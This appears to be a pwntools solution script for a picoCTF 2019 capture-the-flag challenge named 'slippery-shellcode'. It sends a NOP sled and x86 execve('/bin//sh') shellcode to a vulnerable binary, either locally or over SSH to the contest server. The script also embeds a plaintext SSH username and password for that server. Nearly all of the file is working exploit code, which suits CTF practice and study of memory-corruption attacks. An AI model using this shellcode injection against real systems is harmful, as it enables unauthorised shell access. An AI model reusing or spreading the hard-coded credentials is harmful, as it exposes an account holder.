from pwn import *

# Config
LOCAL = True
WRITE = False

# Setup
context.log_level = 'debug'
prob_dir = '/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
    sh = s.process(prob_dir + exe, cwd=prob_dir)

# Build exploit
cmd = b'\x90' * 256   # NOP Sled
cmd += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

# Write exploit to file
if WRITE:
    f = open('input.txt', 'wb')
    f.write(cmd)
    f.close()

# Buffer overflow
sh.sendlineafter('\n', cmd)
# sh.sendlineafter('$ ', str('cd ' + prob_dir))
# sh.sendlineafter('$ ', 'cat flag.txt')
# sh.interactive()
